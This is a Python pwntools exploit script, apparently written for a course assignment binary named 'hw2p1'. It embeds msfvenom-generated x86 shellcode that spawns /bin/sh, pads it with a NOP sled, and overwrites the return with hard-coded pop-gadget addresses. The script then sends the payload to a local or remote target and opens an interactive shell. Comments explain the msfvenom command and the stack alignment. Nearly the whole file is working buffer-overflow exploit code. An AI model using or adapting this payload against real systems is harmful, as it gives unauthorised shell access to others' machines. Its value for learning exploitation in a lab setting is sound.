#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

'''The command : msfvenom -p linux/x86/exec CMD=/bin/sh -f py -v mehta -b "\x00\x0a\x0b\x0c\x0d\x20\xdd" uses the metasploit framework of tools
in order to give us the shell code that we need to pop a shell in the terminal. It takes many arguements. The first one specifies the architecture
that we are working with (Linux System with x86 processor). Then we can search what we want the shellcode to do, in this case we want it to pop a shell,
so we want the CMD variable to say /bin/sh. We then specify the format in which the shell code should be stored in a variable. So in this case we want 
to say python or 'py'. Finally we give the variable a name, in this case 'mehta' and we also give it a list of bad characters to avoid.'''


#------- [PAYLOAD DEFINITION] -------#
mehta =  b""
mehta += b"\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
mehta += b"\x81\x76\x0e\x19\xc3\x6c\xe4\x83\xee\xfc\xe2\xf4"
mehta += b"\x73\xc8\x34\x7d\x4b\xa5\x04\xc9\x7a\x4a\x8b\x8c"
mehta += b"\x36\xb0\x04\xe4\x71\xec\x0e\x8d\x77\x4a\x8f\xb6"
mehta += b"\xf1\xcb\x6c\xe4\x19\xec\x0e\x8d\x77\xec\x1f\x8c"
mehta += b"\x19\x94\x3f\x6d\xf8\x0e\xec\xe4"

stable_nops = b"\x90"*8 # NOPs given in the start of our payload to make space on top of our shellcode.
buff = b"\x90"*(448-len(stable_nops)-len(mehta)) # Buffer NOPs to put in the end of our payload to make space on the stack below our shellcode.
pop3 = pwn.p32(0x08049319) # 32 bit address of a ROP chain of 3 pop instructions.
pop4 = pwn.p32(0x08049318) # 32 bit address of a ROP chain of 4 pop instructions.

# pwn.flat turns all the variables into a single string that we can store in a variable - 'mehta'.
mehta = pwn.flat([stable_nops, mehta, buff, pop3, b'\x90'*12, pop3])

'''We are passing 12 nops in the end, because that is how many nops are required to align both pop instructions on the stack
so that they get called by the return instruction.'''

def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath], aslr=False, *a, **kw)


binPath="./hw2p1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *ultimateQuestion+25
continue
'''.format(**locals())


pwn.context.log_level="critical"
io = start()
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

io.sendline(mehta) 
io.interactive()